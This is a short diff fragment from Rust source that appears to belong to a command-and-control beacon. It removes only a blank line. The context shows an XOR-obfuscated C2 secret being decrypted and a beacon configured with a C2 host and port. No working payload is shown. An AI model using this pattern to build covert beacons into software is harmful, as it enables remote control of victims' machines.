@@ -48,7 +48,6 @@ fn main() {
         // }
 
         let c2_secret = xor_decrypt(&C2_SECRET_ENC, &XOR_KEY);
-
         let c2_config = beacon::C2Config {
             host: &C2_HOST,
             port: C2_PORT,
